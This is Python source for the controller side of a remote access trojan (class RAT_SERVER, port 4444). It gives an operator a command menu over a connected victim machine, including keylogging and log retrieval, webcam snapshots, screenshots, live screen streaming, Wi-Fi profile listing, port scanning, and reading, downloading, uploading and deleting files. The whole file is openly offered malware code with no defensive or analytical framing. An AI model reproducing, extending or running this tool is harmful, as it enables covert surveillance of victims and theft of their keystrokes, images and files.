import random
import socket, os

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    
    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[!] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[!] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
        try:
            from vidstream import StreamingServer
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")
    
    def stop_server(self):
        server.stop_server()
    
    def result(self):
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)
    
    def banner(self):
        print("\n")
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
help                      all commands available
writein <text>            write the text to current opened window
browser                   enter quiery to browser
drives                   all drivers of PC
cpu_cores                 number of CPU cores
systeminfo (extended)     all basic info about system (via cmd)
tasklist                  all system tasks
localtime                 current system time
curpid                    PID of client's process
setwallpaper              set wallpaper
exit                      terminate the session of RAT
''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
        print(f'''
pwd                       get current working directory
cd                        change directory
cd ..                     change directory back
dir                       get all files of current directory
abspath                   get absolute path of files
''')
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
ipconfig                  local ip
portscan                  port scanner
profiles                  network profiles
''')
        print("======================================================")
        print("Keylogger: ")
        print("======================================================")
        print(f'''
keyscan_start             start keylogger
send_logs                 send captured keystrokes
stop_keylogger            stop keylogger
''')
        print("======================================================")
        print("Video: ")
        print("======================================================")
        print(f'''
screenshare               overseing remote PC
breakstream               break screenshare stream
screenshot                capture screenshot
webcam_snap               capture webcam photo
''')
        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
delfile <file>            delete file
editfile <file> <text>    edit file
createfile <file>         create file
download <file> <homedir> download file
upload                    upload file
cp <file1> <file2>        copy file
mv <file> <path>          move file
mkdir <dirname>           make directory
rmdir <dirname>           remove directory
readfile <file>           read from file
        ''')
        print("======================================================")
    
    def execute(self):
        self.banner()
        while True:
            global command
            command = input('Command >>  ')
            
            if command == 'drives':
                self.result()

            elif command == 'usbdrivers':
                self.result()

            elif command == 'setwallpaper':
                client.send(command.encode())
                text = str(input("Enter the filename: "))
                client.send(text.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'keyscan_start':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'send_logs':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command == 'stop_keylogger':
                client.send(command.encode())
                result_output = client.recv(1024).decode()
                print(result_output)

            elif command == 'screenshare':
                client.send(command.encode("utf-8"))
                self.server()

            elif command == 'breakstream':
                self.stop_server()

            elif command == 'webcam_snap':
                client.send(command.encode())
                file = client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
                    f.write(file)
                    f.close()
                print("File is downloaded")
                
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    self.result()
            
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    self.result()
            
            elif command == 'tasklist':
                self.result()
            
            elif command == 'ipconfig':
                self.result()
            
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    self.result()
            
            elif command == 'profiles':
                self.result()

            elif command == 'cpu_cores':
                self.result()
            
            elif command[:2] == 'cd':
                if not command[3:]: 
                    print("No directory")
                else:
                    self.result()
            
            elif command == 'cd ..':
                self.result()
            
            elif command[1:2] == ':':
                self.result()
            
            elif command == 'dir':
                self.result()
            
            elif command == 'portscan':
                self.result()
            
            elif command == 'systeminfo':
                self.result()
            
            elif command == 'localtime':
                self.result()
            
            elif command[:7] == 'abspath':
                if not command[8:]:
                    print("No file")
                else:
                    self.result()
            
            elif command[:8] == 'readfile':
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command.encode())
                    result_output = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_output)
                    print("===================================================")
            
            elif command[:7] == 'browser':
                client.send(command.encode())
                quiery = str(input("Enter the quiery: "))
                client.send(quiery.encode())
                result_output = client.recv(1024).decode()
                print(result_output)
            
            elif command[:2] == 'cp':
                self.result()
            
            elif command[:2] == 'mv':
                self.result()
            
            elif command[:8] == 'editfile':
                self.result()
            
            elif command[:5] == 'mkdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command[:5] == 'rmdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    self.result()
            
            elif command == 'curpid':
                self.result()
            
            elif command == 'pwd':
                self.result()

            elif command[:8] == 'download':
                try:
                    client.send(command.encode())
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

            elif command == 'upload':
                client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)

            elif command == 'help':
                self.banner()
            
            elif command == 'screenshot':
                client.send(command.encode())
                file = client.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                    f.close()
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")
            
            elif command == 'webcam_snap':
                client.send(command.encode())
                file = client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
                    f.write(file)
                    f.close()
                print("File is downloaded")

            elif command == 'exit':
                client.send(command.encode())
                output = client.recv(1024)
                output = output.decode()
                print(output+"ing...")
                s.close()
                client.close()
                break

rat = RAT_SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()